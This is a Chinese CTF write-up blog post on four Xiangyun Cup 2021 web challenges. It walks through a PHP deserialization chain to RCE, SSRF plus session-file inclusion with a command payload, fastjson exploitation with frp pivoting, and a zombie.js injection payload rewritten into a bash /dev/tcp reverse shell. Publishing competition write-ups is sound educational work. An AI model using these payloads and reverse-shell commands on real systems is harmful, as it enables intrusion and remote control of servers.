@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="">
+  <title>2021祥云杯个人web部分wp | fmyyy</title>
+  <meta name="author" content="fmyyy" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="" />
+  
+  <meta name="description" content="前言题目质量很高 被吊打 ezyii说是最新的链子，题目把文件都筛选好了让我们找。写一下我的思路看到RunProcess类 1234567891011121314151617181920212223242526272829303132&lt;?phpnamespace Codeception\Extension;class RunProcess&amp;#123;    protected $output">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021祥云杯个人web部分wp">
+<meta property="og:url" content="https://fmyyy.gitee.io/2021/09/21/2021%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%AA%E4%BA%BAweb%E9%83%A8%E5%88%86wp/index.html">
+<meta property="og:site_name" content="fmyyy">
+<meta property="og:description" content="前言题目质量很高 被吊打 ezyii说是最新的链子，题目把文件都筛选好了让我们找。写一下我的思路看到RunProcess类 1234567891011121314151617181920212223242526272829303132&lt;?phpnamespace Codeception\Extension;class RunProcess&amp;#123;    protected $output">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fmyyy.gitee.io/null">
+<meta property="article:published_time" content="2021-09-21T13:14:04.000Z">
+<meta property="article:modified_time" content="2021-09-21T13:52:19.314Z">
+<meta property="article:author" content="fmyyy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fmyyy.gitee.io/null">
+<meta name="twitter:site" content="@null">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" type="text/css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
+  
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner.webp');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.webp');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                        <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/archives/"><i class="fa fa-file"></i>归档</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/friends/"><i class="fa fa-paw"></i>Friends</a></li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>链接</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://candinya.com">CSDN</a></li>
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://github.com/Candinya/Kratos-Rebirth"></a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">fmyyy</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>fmyyy</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article>
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center">2021祥云杯个人web部分wp</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><i class="fa fa-calendar"></i> 2021-09-21</li>
+                <li><i class="fa fa-user"></i> 作者 fmyyy</li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~5.71K
+                    
+                    字
+                </li>
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                本文最后编辑于 <time datetime="1632232339314"></time> 前，其中的内容可能需要更新。
+            </div>
+            
+                <div class="kratos-post-inner-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezyii"><span class="toc-number">2.</span> <span class="toc-text">ezyii</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B"><span class="toc-number">3.</span> <span class="toc-text">安全检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B1%82%E5%B1%82%E7%A9%BF%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">层层穿透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crawer-z"><span class="toc-number">5.</span> <span class="toc-text">Crawer_z</span></a></li></ol>
+                </div>
+            
+            <hr />
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>题目质量很高 被吊打</p>
+<h1 id="ezyii"><a href="#ezyii" class="headerlink" title="ezyii"></a>ezyii</h1><p>说是最新的链子，题目把文件都筛选好了让我们找。写一下我的思路<br>看到RunProcess类</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$output</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [<span class="string">&#x27;sleep&#x27;</span> =&gt; <span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="built_in">static</span> <span class="variable">$events</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$processes</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;stopProcess();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stopProcess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (array_reverse(<span class="keyword">$this</span>-&gt;processes) <span class="keyword">as</span> <span class="variable">$process</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$process</span>-&gt;isRunning()) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output-&gt;debug(<span class="string">&#x27;[RunProcess] Stopping &#x27;</span> . <span class="variable">$process</span>-&gt;getCommandLine());</span><br><span class="line">            <span class="variable">$process</span>-&gt;stop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;processes = [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>底下有个字符串拼接，可以触发__toString,全局搜索__toString<br><img src="https://img-blog.csdnimg.cn/5a69b7c48ef345138c5d430a3e84aa26.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>AppendStream下有__toString 并且调用了rewind(),找找看这个rewind<br><img src="https://img-blog.csdnimg.cn/00ef5689126548459b8aa0d2738d87fc.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>CachingStream类这里有，并且还调用了seek方法，seek又调用了read方法,在这个read方法里又调用了一个read方法</p>
+<p><img src="https://img-blog.csdnimg.cn/1d59ad2452764ffbbc21770937e35781.png" alt="在这里插入图片描述"><br>我们可以控制$this-&gt;stream为我们想要的类，查找read，最后在PumpStream类里</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PumpStream</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$source</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$tellPos</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$metadata</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$buffer</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getSize</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$length</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;buffer-&gt;read(<span class="variable">$length</span>);</span><br><span class="line">        <span class="variable">$readLen</span> = strlen(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tellPos += <span class="variable">$readLen</span>;</span><br><span class="line">        <span class="variable">$remaining</span> = <span class="variable">$length</span> - <span class="variable">$readLen</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$remaining</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pump(<span class="variable">$remaining</span>);</span><br><span class="line">            <span class="variable">$data</span> .= <span class="keyword">$this</span>-&gt;buffer-&gt;read(<span class="variable">$remaining</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tellPos += strlen(<span class="variable">$data</span>) - <span class="variable">$readLen</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">pump</span>(<span class="params"><span class="variable">$length</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;source) &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="variable">$data</span> = call_user_func(<span class="keyword">$this</span>-&gt;source, <span class="variable">$length</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$data</span> === <span class="literal">false</span> || <span class="variable">$data</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;source = <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;buffer-&gt;write(<span class="variable">$data</span>);</span><br><span class="line">                <span class="variable">$length</span> -= strlen(<span class="variable">$data</span>);</span><br><span class="line">            &#125; <span class="keyword">while</span> (<span class="variable">$length</span> &gt; <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个类有read方法 ，read调用了pump  pump方法调用了call_user_func，所以可以RCE</p>
+<p>就写到这吧 我把链子找完的时候队友已经出了，还告诉我网上有公开的poc，心累，说好的最新呢</p>
+<h1 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h1><p><img src="https://img-blog.csdnimg.cn/78a134db796f4541a1742bbd85e847f9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>检测127.0.0.1成功了 是ssrf，利用ssrf扫路径扫到了<a target="_blank" rel="noopener" href="http://127.0.0.1/admin/include123.php">http://127.0.0.1/admin/include123.php</a><br>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;\/\*|\*|\.\.\/|\.\/|load_file|outfile|dumpfile|sub|hex|where&quot;</span>; </span><br><span class="line"><span class="variable">$pattern</span> .= <span class="string">&quot;|file_put_content|file_get_content|fwrite|curl|system|eval|assert&quot;</span>; </span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>; </span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|`|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec|http|.php|.ph|.log|\@|:\/\/|flag|access|error|stdout|stderr&quot;</span>; </span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|file|dict|gopher&quot;</span>; </span><br><span class="line"><span class="comment">//累了累了，饮茶先 </span></span><br><span class="line"></span><br><span class="line"><span class="variable">$vpattern</span> = explode(<span class="string">&quot;|&quot;</span>,<span class="variable">$pattern</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$vpattern</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;     </span><br><span class="line">    <span class="keyword">if</span> (preg_match( <span class="string">&quot;/<span class="subst">$value</span>/i&quot;</span>, <span class="variable">$u</span> ))&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;检测到恶意字符&quot;</span>; </span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$u</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>包含一下session文件呗<br>payload:</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/admin/include123.php?u=/tmp/sess_%E4%BD%A0%E7%9A%84PHPSESSID&amp;payload=">http://127.0.0.1/admin/include123.php?u=/tmp/sess_你的PHPSESSID&amp;payload=</a><?=\`cat\t/getf???.sh`?><br>成功了 挺奇怪的 源码里ban了反引号我这里却可以用 不管了 flag出了就行。</p>
+<h1 id="层层穿透"><a href="#层层穿透" class="headerlink" title="层层穿透"></a>层层穿透</h1><p>这题做了好久，只会一点java的我靠着github上的一键shell poc做完了<br>第一层反弹shell，github有直接可以利用的工具<br><img src="https://img-blog.csdnimg.cn/f7b122c6fbca457f9589a2ad5b3809bc.png" alt="在这里插入图片描述"></p>
+<p>弹个shell到自己的vps上。<br>题目提示内网<br>信息搜集到了10.10.1.11:8080,估计是内网web环境，先把附件源码反编译一下，因为题目环境20分钟刷新一次，所以现在本地打<br>对着源码逻辑先登录，账号密码源码里可以直接找到<br><img src="https://img-blog.csdnimg.cn/08abfdf0dfe449449fc727173e2ec46e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>看到admin/test路由存在fastjson反序列化点。<br>不怎么会java反序列化，但是github上有不出网直接在数据包里回显的一键shellpoc<br><a target="_blank" rel="noopener" href="https://github.com/depycode/fastjson-c3p0">https://github.com/depycode/fastjson-c3p0</a><br>照着github上的readme直接打，发现提示太短，看源码<br><img src="https://img-blog.csdnimg.cn/a753c20807b74e7aa6eb0bce72f5dd4a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>把poc复制两边再打就打通了<br>本地打通了，之后是题目。我花了大部分时间在搞代理 有几个小时吧 最后选择了frp 确实方便<br><a target="_blank" rel="noopener" href="https://hackergu.com/frps-kali/">frp教程</a><br>端口转发成功后按照刚刚本地的步骤直接打就行<br><img src="https://img-blog.csdnimg.cn/483ae96e7bfa49babd8a1ce319f87e66.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>（一定找个时间好好学java）</p>
+<h1 id="Crawer-z"><a href="#Crawer-z" class="headerlink" title="Crawer_z"></a>Crawer_z</h1><p><img src="https://img-blog.csdnimg.cn/b6ad81601b6f46ceb995a071a5f5ed4d.png" alt="在这里插入图片描述"><br>引用了zombie框架，谷歌查找 全网只找到这个框架一篇漏洞<br><a target="_blank" rel="noopener" href="https://ha.cker.in/index.php/Article/13563">https://ha.cker.in/index.php/Article/13563</a><br>漏洞描述<br><img src="https://img-blog.csdnimg.cn/aba409232272439c9c9608513b168cd4.png" alt="在这里插入图片描述"><br>攻击者可以在他们的页面中插入JS代码来利用zombiejs代码注入漏洞。如果使用zombiejs 抓取此类页面，则运行爬虫的机器将运行攻击者提供的任意命令。为了比较，jsdom 默认禁用脚本执行。</p>
+<p>想办法让题目访问我们准备的恶意页面就行。<br>payload在这个博客里都准备好了，提取一下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> codeToExec = <span class="string">&quot;var sync=require(&#x27;child_process&#x27;).spawnSync; &quot;</span> +</span><br><span class="line">    <span class="string">&quot;var ls = sync(&#x27;cat&#x27;, [&#x27;./resources/test.html&#x27;]); console.log(ls.output.toString());&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> exploit = <span class="string">&quot;c=&#x27;constructor&#x27;;require=this[c][c](&#x27;return process&#x27;)().mainModule.require;&quot;</span> + codeToExec;</span><br><span class="line"><span class="keyword">var</span> attackVector = <span class="string">&quot;c=&#x27;constructor&#x27;;this[c][c](\&quot;&quot;</span> + exploit + <span class="string">&quot;\&quot;)()&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(attackVector)</span><br></pre></td></tr></table></figure>
+
+<p>改成弹shell的</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="string">&#x27;constructor&#x27;</span>;<span class="built_in">this</span>[c][c](<span class="string">&quot;c=&#x27;constructor&#x27;;require=this[c][c](&#x27;return process&#x27;)().mainModule.require;var sync=require(&#x27;child_process&#x27;).spawnSync; var ls = sync(&#x27;bash&#x27;, [&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;],); console.log(ls.output.toString());&quot;</span>)()</span><br></pre></td></tr></table></figure>
+
+<p>有了payload，我们要想办法让题目访问我们的恶意页面。看一下源码。<br>在user.js下<br><img src="https://img-blog.csdnimg.cn/c9177b737913431aa029ad706c0fc906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到访问/user/bucket似乎会自动访问我们个人信息里设置的bucket，尝试访问。<br><img src="https://img-blog.csdnimg.cn/ebbed7c8f7364729baafc34543fd41dc.png" alt="在这里插入图片描述"><br>尝试更改bucket设置，先看源码<br><img src="https://img-blog.csdnimg.cn/befb6a4a5e3246bc9a2eba4e5d28ffa4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>在checkBucket函数下，看到bucket的要求，必须以http:或者https:为开头，且必须包含oss-cn-beijing.ichunqiu.com</code><br>我们尝试修改前面为自己的vps地址<br><img src="https://img-blog.csdnimg.cn/b4a67b9931f34e01bd4259723dcc97d2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击更新<br><img src="https://img-blog.csdnimg.cn/7987e98d4aa245c79301e5986c30db73.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>变回原来的了，并且提示admin会来检查，但在源码里看到<br><img src="https://img-blog.csdnimg.cn/1d6bba599d594c2081c4c4994a528ce0.png" alt="在这里插入图片描述"><br>这里其实算是更改失败了，admin不会去检查<br><img src="https://img-blog.csdnimg.cn/2fd3753b7d814a14833af6e600acdedd.png" alt="在这里插入图片描述"><br>源码里有个重定向到<br>/user/verify?token=${authToken}，我们尝试用队伍token<br>浏览器url输入队伍token<br><img src="https://img-blog.csdnimg.cn/01bf22d099f74f74ae3bc429e900d120.png" alt="在这里插入图片描述"><br>修改bucket，但不要点击update，直接在访问我们放入队伍token后的url<br><img src="https://img-blog.csdnimg.cn/d713cdf68c6e4c9fa948ed41c3b75423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提示更改成功 看到我们的bucket也被设置成了我们的vps地址<br>其实这里我还没怎么懂原理，只是试了一下发现可以，那就歪打正着直接用。<br><img src="https://img-blog.csdnimg.cn/a2e7b8bb30cc4d87986f4b80c9050cbc.png" alt="在这里插入图片描述"><br>再访问/user/bucket<br><img src="https://img-blog.csdnimg.cn/feeb27b89ec54911a069e17ff189e8af.png" alt="在这里插入图片描述"><br>回显的内容变了，报错404，这是因为我的vps上没有oss-cn-beijing.ichunqiu.com这个文件。<br><code>到这里思路就很清晰了，我们在vps上放置一个oss-cn-beijing.ichunqiu.com.html恶意文件，然后修改bucket为http://公网ip地址/oss-cn-beijing.ichunqiu.com.html</code><br>并且这个html文件已经被我们插入了用&lt;script&gt;标签包裹的恶意payload<br><img src="https://img-blog.csdnimg.cn/125545354543492c85cbc37b09344ad7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>服务器起个监听<br><img src="https://img-blog.csdnimg.cn/6e7fa1e56b664f6fbed1e3abdc074dc8.png" alt="在这里插入图片描述"><br>题目内访问/user/bucket<br><img src="https://img-blog.csdnimg.cn/1f1bc9111abd40e9a4fdfe750a1774f7.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/37c61dacd41a4ae698c02013138d8b93.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>弹成功了。</p>
+<p>这次比赛就做了这四道题，做完java那题距比赛结束就1小时了，被队友带飞进了前三十 队友们tql</p>
+
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5>本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
